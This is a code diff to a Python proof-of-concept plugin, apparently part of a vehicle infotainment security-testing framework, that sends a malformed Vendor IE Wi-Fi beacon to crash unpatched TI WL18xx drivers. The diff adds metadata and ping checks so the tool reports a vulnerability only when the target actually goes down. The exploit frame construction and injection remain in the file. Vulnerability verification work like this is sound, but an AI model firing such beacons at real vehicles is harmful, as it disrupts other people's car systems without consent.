@@ -10,10 +10,19 @@ Prerequisites: 支持Monitor模式的无线网卡 (如 wlan0mon)，已安装 sca
 Usage: python3 36_WiFi_TI_WL18xx_Overflow.py <interface>
 """
 import sys
-import time
+import subprocess
 from iv_plugin_base import IVIVulnerabilityPlugin
 
 class TIWL18xxOverflowPlugin(IVIVulnerabilityPlugin):
+    meta_poc_name = "WiFi TI WL18xx Overflow"
+    meta_cve_id = "N/A"
+    meta_severity = "Medium"
+    meta_protocol = "rf"
+    meta_target_os = ["all"]
+    meta_required_params = ["interface"]
+    is_disruptive = False
+    meta_destructive_level = "Safe"
+
     def check_prerequisites(self):
         try:
             import scapy.all as scapy
@@ -22,10 +31,25 @@ class TIWL18xxOverflowPlugin(IVIVulnerabilityPlugin):
             return False
             
         self.interface = self.params.get("interface", "")
+        self.probe_ip = self.params.get("probe_ip")
         if not self.interface:
             self.logger.error("未指定无线网卡接口 (如 wlan0mon)。")
             return False
         return True
+
+    def _ping(self, ip):
+        if not ip:
+            return None
+        try:
+            result = subprocess.run(
+                ["ping", "-c", "1", "-W", "1", ip],
+                capture_output=True,
+                text=True,
+                timeout=3,
+            )
+            return result.returncode == 0
+        except Exception:
+            return None
 
     def exploit(self):
         self.logger.info(f"准备发送畸形 Vendor IE 信标帧，使用网卡: {self.interface}")
@@ -50,6 +74,7 @@ class TIWL18xxOverflowPlugin(IVIVulnerabilityPlugin):
             vendor_ie = Dot11Elt(ID=221, info=malicious_payload, len=len(malicious_payload))
             
             frame = RadioTap()/dot11/beacon/essid/vendor_ie
+            pre_ping = self._ping(self.probe_ip)
             
             self.logger.info("开始发送溢出探测信标 (单次发送 PoC 模式)...")
             try:
@@ -60,12 +85,18 @@ class TIWL18xxOverflowPlugin(IVIVulnerabilityPlugin):
                 self.logger.error(f"设备发送失败，请检查网卡是否支持 Monitor 模式: {str(e)}")
                 return {"status": "error", "details": str(e)}
                 
-            self.logger.warning("[!] 如果目标车辆采用未打补丁的 TI WL18xx 芯片，Wi-Fi 可能会立即断开/崩溃。")
+            post_ping = self._ping(self.probe_ip)
+            if self.probe_ip and pre_ping is True and post_ping is False:
+                return {
+                    "status": "success",
+                    "vulnerable": True,
+                    "details": f"Probe host {self.probe_ip} became unreachable immediately after malformed beacon injection, consistent with WL18xx driver failure."
+                }
             
             return {
                 "status": "success",
-                "vulnerable": True,
-                "details": "Malformed Vendor IE beacon transmitted. Wait for target driver halt."
+                "vulnerable": False,
+                "details": "Malformed Vendor IE beacon transmitted, but no automated target failure was verified. Provide probe_ip for strict validation."
             }
 
         except Exception as e:
@@ -79,5 +110,5 @@ if __name__ == "__main__":
     if len(sys.argv) < 2:
         print("Usage: python3 36_WiFi_TI_WL18xx_Overflow.py <interface>")
         sys.exit(1)
-    plugin = TIWL18xxOverflowPlugin({"interface": iface})
+    plugin = TIWL18xxOverflowPlugin({"interface": sys.argv[1]})
     plugin.run_verify()
